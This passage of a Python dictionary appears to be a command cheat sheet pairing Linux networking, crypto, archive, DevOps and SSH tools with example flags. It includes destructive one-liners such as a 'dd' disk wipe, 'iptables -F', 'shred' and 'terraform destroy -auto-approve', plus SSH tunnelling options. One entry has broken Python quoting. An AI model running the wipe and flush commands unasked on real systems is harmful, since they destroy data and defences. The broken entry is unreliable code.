        ("-p PID", "Attach to process"),
    ],



    # === FINAL PRE-BUILT EXAMPLES ===
    "netstat": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
        ("-c", "Continuous mode"),
    ],
    "ss": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
    ],
    "arp": [
        ("-a", "ARP table"),
        ("-d 192.168.1.1", "Delete entry"),
    ],
    "route": [
        ("-n", "Routing table"),
        ("add default gw 192.168.1.1", "Add gateway"),
    ],
    "iptables": [
        ("-L -n -v", "List rules"),
        ("-A INPUT -s IP -j DROP", "Block IP"),
        ("-A INPUT -p tcp --dport 80 -j ACCEPT", "Allow port 80"),
        ("-F", "Flush rules"),
    ],
    "ufw": [
        ("status", "Check status"),
        ("enable", "Enable firewall"),
        ("allow 80/tcp", "Allow port 80"),
        ("deny from IP", "Block IP"),
    ],
    "sysctl": [
        ("-a", "All settings"),
        ("net.ipv4.ip_forward=1", "Enable forwarding"),
    ],
    "mount": [
        ("-o ro,noexec /dev/sdb1 /mnt", "Read-only mount"),
        ("", "List mounts"),
    ],
    "dd": [
        ("if=/dev/sda of=image.dd bs=4M status=progress", "Disk image"),
        ("if=/dev/urandom of=file bs=1M count=100", "Random file"),
        ("if=/dev/zero of=/dev/sdb bs=1M", "Wipe disk"),
    ],
    "shred": [
        ("-n 7 -z file.txt", "7 pass shred"),
        ("-u file.txt", "Remove after"),
        ("-v file.txt", "Verbose"),
    ],
    "wipe": [
        ("-f file.txt", "Force wipe"),
        ("-r dir/", "Recursive wipe"),
    ],
    "srm": [
        ("-v file.txt", "Verbose secure delete"),
        ("-r dir/", "Recursive"),
    ],
    "openssl": [
        ("genrsa -out key.pem 2048", "Generate RSA key"),
        ("req -new -key key.pem -out csr.pem", "Generate CSR"),
        ("x509 -req -days 365 -in csr.pem -signkey key.pem -out cert.pem", "Self-sign cert"),
        ("s_client -connect target.com:443", "SSL connect"),
        ("enc -aes-256-cbc -in file.txt -out file.enc -pass pass:password", "Encrypt file"),
        ("enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:password", "Decrypt file"),
    ],
    "gpg": [
        ("--full-generate-key", "Generate key"),
        ("-c file.txt", "Symmetric encrypt"),
        ("-d file.gpg", "Decrypt"),
        ("--list-keys", "List keys"),
        ("--export -a user@email.com > public.key", "Export public key"),
    ],
    "base64": [
        ("file.txt", "Encode file"),
        ("-d file.b64", "Decode file"),
        ("-w 0 file.txt", "No line wrap"),
    ],
    "md5sum": [
        ("file.txt", "MD5 hash"),
        ("-c checksum.md5", "Check hashes"),
    ],
    "sha256sum": [
        ("file.txt", "SHA256 hash"),
        ("-c checksum.sha256", "Check hashes"),
    ],
    "zip": [
        ("archive.zip file1 file2", "Create archive"),
        ("-r archive.zip dir/", "Recursive"),
        ("-P password archive.zip file", "With password"),
        ("-e archive.zip file", "Encrypt"),
    ],
    "unzip": [
        ("archive.zip", "Extract"),
        ("-P password archive.zip", "Password extract"),
        ("archive.zip -d /output/", "Output directory"),
    ],
    "tar": [
        ("-czf archive.tar.gz dir/", "Create gzip"),
        ("-xzf archive.tar.gz", "Extract gzip"),
        ("-cjf archive.tar.bz2 dir/", "Create bzip2"),
    ],
    "wget": [
        ("https://target.com/file.txt", "Download"),
        ("-r -np -k https://target.com", "Mirror site"),
        ("-O output.txt https://target.com", "Save as"),
        ("--user-agent='Mozilla/5.0' https://target.com", "Custom UA"),
    ],
    "git": [
        ("clone https://github.com/user/repo.git", "Clone repo"),
        ("clone --depth 1 https://github.com/user/repo.git", "Shallow clone"),
        ("log --oneline", "Commit history"),
        ("diff", "Show changes"),
    ],
    "python3": [
        ("-m http.server 8080", "HTTP server"),
        ("-c 'print("hello")'", "One-liner"),
        ("script.py", "Run script"),
    ],
    "pip": [
        ("install package", "Install package"),
        ("install -r requirements.txt", "Install from file"),
        ("list", "List installed"),
        ("freeze > requirements.txt", "Export list"),
    ],
    "go": [
        ("build main.go", "Build binary"),
        ("run main.go", "Run without build"),
        ("install github.com/tool/cmd@latest", "Install tool"),
    ],
    "gem": [
        ("install package", "Install gem"),
        ("list", "List gems"),
    ],
    "npm": [
        ("install package", "Install package"),
        ("install -g package", "Global install"),
        ("start", "Start project"),
    ],
    "docker": [
        ("ps -a", "List containers"),
        ("images", "List images"),
        ("run -it ubuntu bash", "Run interactive"),
        ("build -t name .", "Build image"),
        ("exec -it container bash", "Exec into container"),
    ],
    "kubectl": [
        ("get pods", "List pods"),
        ("get pods --all-namespaces", "All namespaces"),
        ("get nodes", "List nodes"),
        ("exec -it pod -- bash", "Exec into pod"),
        ("apply -f deployment.yaml", "Apply config"),
        ("delete pod name", "Delete pod"),
    ],
    "terraform": [
        ("init", "Initialize"),
        ("plan", "Plan changes"),
        ("apply -auto-approve", "Apply changes"),
        ("destroy -auto-approve", "Destroy resources"),
    ],
    "ansible": [
        ("all -m ping", "Ping all hosts"),
        ("webservers -m command -a 'uptime'", "Run command"),
        ("-i inventory playbook.yml", "Run playbook"),
    ],
    "ssh": [
        ("user@host", "Basic connect"),
        ("-p 2222 user@host", "Custom port"),
        ("-i key.pem user@host", "Key auth"),
        ("-L 8080:localhost:80 user@host", "Local forward"),
        ("-R 8080:localhost:80 user@host", "Remote forward"),
        ("-D 1080 user@host", "SOCKS proxy"),
    ],
    "scp": [
        ("file.txt user@host:/path/", "Copy to remote"),
        ("user@host:/path/file.txt .", "Copy from remote"),
        ("-r dir/ user@host:/path/", "Recursive"),
    ],
    "rsync": [
        ("-av dir/ user@host:/path/", "Sync to remote"),
        ("-av user@host:/path/ dir/", "Sync from remote"),
        ("-av --delete dir/ /backup/", "Mirror sync"),
    ],
    "screen": [
        ("-S session_name", "Named session"),
        ("-r session_name", "Reattach"),
        ("-ls", "List sessions"),
    ],
    "tmux": [
        ("new -s session_name", "New session"),
        ("attach -t session_name", "Attach"),
        ("ls", "List sessions"),
    ],
    "htop": [
        ("", "Interactive process viewer"),
        ("-u username", "Filter user"),
    ],
    "iftop": [
        ("-i wlan0", "Interface traffic"),
        ("-P", "Show ports"),
    ],
    "nethogs": [
        ("wlan0", "Interface bandwidth"),
        ("-d 5 wlan0", "5s refresh"),
    ],
    "vnstat": [
        ("-i wlan0", "Interface stats"),
        ("-d", "Daily stats"),
        ("-m", "Monthly stats"),
    ],

}
